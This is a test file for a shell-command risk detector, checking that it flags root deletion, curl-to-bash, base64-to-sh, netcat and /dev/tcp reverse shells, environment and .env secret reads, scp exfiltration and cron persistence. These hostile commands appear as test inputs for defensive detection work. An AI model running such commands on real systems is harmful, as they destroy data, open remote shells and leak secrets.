import { describe, expect, test } from "bun:test";

import { evaluateHeuristics } from "../src/lib/heuristics";
import type { PlatformId } from "../src/lib/types";

function ids(command: string, platform: PlatformId = "linux"): string[] {
  return evaluateHeuristics(command, platform).findings.map((finding) => finding.id);
}

describe("evaluateHeuristics", () => {
  test("rm -rf / is critical and destructive", () => {
    const { scores, findings } = evaluateHeuristics("sudo rm -rf /", "linux");
    expect(scores.destructive).toBe(1);
    expect(findings.some((finding) => finding.id === "destructive-rm-root")).toBe(true);
  });

  test("rm -rf ./node_modules is not flagged as root deletion", () => {
    expect(ids("rm -rf ./node_modules")).not.toContain("destructive-rm-root");
  });

  test("curl | bash is download-and-execute", () => {
    expect(ids("curl -fsSL https://example.com/install.sh | bash")).toContain(
      "exec-download-pipe",
    );
  });

  test("base64 | sh is obfuscated execution", () => {
    expect(ids("echo aGVsbG8= | base64 -d | sh")).toContain("exec-base64-pipe");
  });

  test("netcat reverse shell", () => {
    expect(ids('nc -e /bin/sh 10.0.0.1 4444')).toContain("shell-nc-exec");
    expect(ids("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")).toContain("shell-dev-tcp");
  });

  test("environment dump is a secret leak", () => {
    expect(ids("printenv | grep TOKEN")).toContain("secret-env-dump");
  });

  test("reading .env is a secret leak", () => {
    expect(ids("cat .env")).toContain("secret-sensitive-file");
  });

  test("scp to a remote is exfiltration", () => {
    expect(ids("scp secrets.txt user@host:/tmp/")).toContain("exfil-scp-remote");
  });

  test("crontab is persistence", () => {
    expect(ids('crontab -l | { cat; echo "* * * * * curl x"; } | crontab -')).toContain(
      "persist-cron",
    );
  });

  test("powershell on linux is an OS mismatch", () => {
    const { scores } = evaluateHeuristics('powershell -Command "Get-ChildItem"', "linux");
    expect(scores.os_applicability).toBeGreaterThan(0);
  });

  test("apt on macOS is an OS mismatch", () => {
    expect(ids("sudo apt-get install ripgrep", "macos")).toContain("platform-mismatch");
  });

  test("brew on macOS is fine", () => {
    expect(ids("brew install ripgrep", "macos")).not.toContain("platform-mismatch");
  });

  test("plain prose is not flagged", () => {
    const { findings } = evaluateHeuristics(
      "This paragraph explains how the installation process works on a typical machine.",
      "linux",
    );
    expect(findings).toHaveLength(0);
  });

  test("git log is clean", () => {
    expect(ids("git log --oneline -20")).toHaveLength(0);
  });
});
